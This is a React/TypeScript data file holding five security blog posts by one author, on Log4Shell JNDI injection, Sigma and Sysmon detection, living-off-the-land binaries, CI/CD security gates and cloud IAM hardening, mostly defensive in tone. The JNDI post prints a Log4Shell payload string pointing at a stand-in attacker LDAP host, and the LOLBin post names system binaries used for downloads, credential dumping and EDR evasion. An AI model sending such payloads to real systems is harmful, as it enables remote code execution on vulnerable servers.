import React from 'react';

export interface BlogPost {
    slug: string;
    title: string;
    excerpt: string;
    date: string;
    updatedAt?: string;
    author: string;
    category: string;
    tags?: string[];
    takeaways?: string[];
    readTime: string;
    content: React.ReactNode;
}

export const blogPosts: BlogPost[] = [
    {
        slug: "jndi-injection-patterns",
        title: "Anatomy of RCE: Investigating JNDI Injection Patterns",
        excerpt: "A surgical deep-dive into Java Naming and Directory Interface (JNDI) vulnerabilities and the strategic mitigation of remote code execution in enterprise ecosystems.",
        date: "April 12, 2026",
        updatedAt: "April 13, 2026",
        author: "Olabanji Okunola",
        category: "Threat Intel",
        tags: ["JNDI", "RCE", "Java Security", "Exploit Analysis"],
        takeaways: [
            "ATTACK: RCE via Log4Shell (JNDI Injection).",
            "DETECTION: Sigma-based log normalization and correlation.",
            "RESPONSE: Automated mitigation via IDS-integrated playbooks."
        ],
        readTime: "12 min read",
        content: (
            <div className="space-y-6 text-muted-foreground leading-relaxed">
                <p>JNDI injection remains one of the most potent attack vectors in enterprise Java environments. By leveraging the dynamic nature of lookups, an adversary can force a vulnerable application to fetch and execute a malicious class from a remote RMI or LDAP server.</p>
                <div className="bg-secondary/50 p-6 rounded-xl font-mono text-xs border border-white/5 text-primary">
                    {`$\{jndi:ldap://attacker.com/Exploit}`}
                </div>
                <h3 className="text-xl font-bold text-foreground">The Logic of the Attack</h3>
                <p>The core of the vulnerability lies in the improper sanitization of user-controlled input passed to loggers or lookup functions. Once the JNDI lookup is triggered, the underlying provider (LDAP, RMI, DNS) attempts to resolve the reference, often leading to unauthenticated class loading.</p>
                <h3 className="text-xl font-bold text-foreground">Strategic Mitigation</h3>
                <ol className="list-decimal list-inside space-y-2">
                    <li>Disable remote class loading via JVM properties: <code className="text-primary italic">com.sun.jndi.ldap.object.trustURLCodebase=false</code></li>
                    <li>Implement strict egress filtering to prevent internal servers from initiating unauthorized LDAP/RMI requests.</li>
                    <li>Update logging frameworks to versions that disable lookups by default.</li>
                </ol>
            </div>
        )
    },
    {
        slug: "detection-engineering-sigma-sysmon",
        title: "The Detection Engineering Loop: Sigma & Sysmon",
        excerpt: "Building a resilient SOC detection pipeline by operationalizing Sysmon telemetry and Sigma rules for high-fidelity threat hunting.",
        date: "April 11, 2026",
        updatedAt: "April 12, 2026",
        author: "Olabanji Okunola",
        category: "Defensive Ops",
        tags: ["SIEM", "SOC", "Sigma", "Sysmon", "Detection Engineering"],
        takeaways: [
            "ATTACK: Lateral movement and credential harvesting.",
            "DETECTION: Sysmon-to-Kibana pipeline for anomaly spotting.",
            "RESPONSE: Dashboard alerts and incident isolation protocols."
        ],
        readTime: "10 min read",
        content: (
            <div className="space-y-6 text-muted-foreground leading-relaxed">
                <p>Detection engineering is not about collecting more data; it is about collecting the *right* data. By combining Sysmon’s granular endpoint telemetry with the standardized logic of Sigma rules, we create a detection pipeline that is both tool-agnostic and highly effective.</p>
                <h3 className="text-xl font-bold text-foreground">High-Fidelity Telemetry</h3>
                <p>Focusing on Process Creation (Event ID 1) and Network Connection (Event ID 3) events allows us to map adversary behavior directly to the MITRE ATT&CK matrix.</p>
                <h3 className="text-xl font-bold text-foreground">Sigma Rule Implementation</h3>
                <p>Sigma allows us to define detection logic once and deploy it across Splunk, ELK, or Microsoft Sentinel. This modularity is key to a modern, agile SOC team.</p>
                <div className="mt-8 p-6 rounded-2xl border border-primary/20 bg-primary/5">
                    <h4 className="text-sm font-black uppercase tracking-widest text-primary mb-2">Live Demonstration</h4>
                    <p className="text-xs mb-4">See these detection patterns in action on my proprietary SIEM platform.</p>
                    <a href="/#projects" className="text-xs font-bold underline hover:text-primary transition-colors">Launch SIEM Dashboard →</a>
                </div>
            </div>
        )
    },
    {
        slug: "living-off-the-land-techniques",
        title: "Shadow in the Shell: Modern 'Living off the Land'",
        excerpt: "How advanced adversaries utilize trusted system binaries (LOLBins) to bypass EDR and execute stealthy persistent operations without custom malware.",
        date: "April 10, 2026",
        updatedAt: "April 11, 2026",
        author: "Olabanji Okunola",
        category: "Offensive Strategy",
        tags: ["Red Team", "LOLBins", "EDR Bypass", "Stealth Persistence"],
        takeaways: [
            "ATTACK: LOLBin exploitation (certutil/bitsadmin) for EDR bypass.",
            "DETECTION: Behavioral anomaly monitoring of parent-child process chains.",
            "RESPONSE: Strict execution policies and relationship-based alerting."
        ],
        readTime: "15 min read",
        content: (
            <div className="space-y-6 text-muted-foreground leading-relaxed">
                <p>Traditional EDR solutions are increasingly adept at detecting custom malware. To counter this, Red Teams and APT groups have pivoted to 'Living off the Land'—using legitimate, cryptographically signed OS binaries to perform malicious actions.</p>
                <h3 className="text-xl font-bold text-foreground">The LOLBin Advantage</h3>
                <p>Binaries like <code className="text-primary">certutil.exe</code>, <code className="text-primary">bitsadmin.exe</code>, and <code className="text-primary">powershell.exe</code> are trusted by the system. When used creatively, they can be utilized for file downloads, credential dumping, and persistence without triggering standard signature-based alerts.</p>
                <h3 className="text-xl font-bold text-foreground">Adversary Emulation Tips</h3>
                <p>When conducting an audit, always look for unusual parent-child process relationships, such as <code className="text-primary">w3wp.exe</code> spawning <code className="text-primary">cmd.exe</code> with suspicious command-line arguments.</p>
            </div>
        )
    },
    {
        slug: "zero-trust-ci-cd-architectures",
        title: "Zero-Trust CI/CD: Architecting Secure Continuous Delivery",
        excerpt: "A blueprint for integrating automated security gates (SAST, DAST, Secret Scanning) into the dev pipeline to achieve a true 'Secure-by-Design' lifecycle.",
        date: "April 08, 2026",
        updatedAt: "April 09, 2026",
        author: "Olabanji Okunola",
        category: "DevSecOps",
        tags: ["CI/CD", "DevSecOps", "SAST", "Pipeline Security", "Zero Trust"],
        takeaways: [
            "Integrate automated security scanning at every stage of the pipeline.",
            "Enable strict secret scanning to prevent accidental credential leakage.",
            "Implement mandatory SCA to audit third-party dependency vulnerabilities."
        ],
        readTime: "9 min read",
        content: (
            <div className="space-y-6 text-muted-foreground leading-relaxed">
                <p>Security must be a 'First-Class' citizen in the CI/CD pipeline. Shifting security to the left means automating vulnerability detection at the earliest stages of the development lifecycle.</p>
                <h3 className="text-xl font-bold text-foreground">The 3 Pillars of Pipeline Security</h3>
                <ul className="list-disc list-inside space-y-2">
                    <li><span className="font-bold">SAST (Static Analysis)</span>: Identifying code-level vulnerabilities before build time.</li>
                    <li><span className="font-bold">Secret Scanning</span>: Preventing the accidental commit of API keys and credentials.</li>
                    <li><span className="text-bold">SCA (Software Composition Analysis)</span>: Auditing third-party dependencies for known vulnerabilities (CVEs).</li>
                </ul>
                <p>By enforcing these gates, we ensure that every deployment meets our rigorous 'Security Handshake' standards.</p>
            </div>
        )
    },
    {
        slug: "cloud-identity-perimeter",
        title: "Identity is the New Perimeter: Hardening Multi-Cloud IAM",
        excerpt: "Moving beyond traditional firewalls to a robust Identity and Access Management (IAM) framework for secure AWS and Azure environments.",
        date: "April 05, 2026",
        updatedAt: "April 06, 2026",
        author: "Olabanji Okunola",
        category: "Security",
        tags: ["Cloud Security", "IAM", "AWS", "Azure", "Zero Trust"],
        takeaways: [
            "Identity is the primary security boundary in decentralized cloud environments.",
            "Implement Just-In-Time (JIT) access to minimize service account exposure.",
            "Use Service Control Policies (SCPs) to restrict high-risk global regions."
        ],
        readTime: "11 min read",
        content: (
            <div className="space-y-6 text-muted-foreground leading-relaxed">
                <p>In the cloud, IP-based perimeters are largely obsolete. In a decentralized environment, **Identity** becomes the only consistent security boundary. Hardening IAM is the most critical task for a modern Security Engineer.</p>
                <h3 className="text-xl font-bold text-foreground">Least Privilege is a Mandate, Not a Suggestion</h3>
                <p>Over-privileged service accounts are the leading cause of lateral movement in the cloud. We must implement **Just-In-Time (JIT)** access and monitor for 'Access Key' rotation religiously.</p>
                <div className="bg-secondary/50 p-6 rounded-xl font-mono text-xs border border-white/5 text-primary">
                    {`# AWS CLI Example for IAM Audit
aws iam list-access-keys --user-name <username>`}
                </div>
                <h3 className="text-xl font-bold text-foreground">Strategic Takeaways</h3>
                <ul className="list-disc list-inside space-y-2">
                    <li>Enable **Multi-Factor Authentication (MFA)** for all root and administrative accounts.</li>
                    <li>Utilize **Service Control Policies (SCPs)** to restrict regions and high-risk services.</li>
                    <li>Implement automated **IAM Access Analyzer** audits to detect public exposure.</li>
                </ul>
            </div>
        )
    }
];
